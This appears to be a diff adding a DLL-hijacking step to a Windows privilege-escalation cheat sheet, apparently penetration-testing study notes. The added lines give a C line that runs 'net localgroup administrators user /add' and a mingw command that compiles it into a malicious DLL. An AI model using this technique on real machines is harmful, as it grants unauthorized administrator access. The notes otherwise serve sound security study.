@@ -63,6 +63,11 @@ Dangerous perms: SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS
 
     accesschk.exe /accepteula -uvqc user [service name]             #look for: SERVICE_STOP, SERVICE_START    
 
+Find service with a DLL that isn't found, able to start/stop service and searched location is in a writeable directory. Also need C source code- transfer to Kali - insert line then compile.  
+
+    system("cmd.exe /k net localgroup administrators user /add");             #line to insert in C code
+    
+    x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll              #compile on Kali then transfer 
 ## Registry Exploits
 ### Autoruns   
 Search
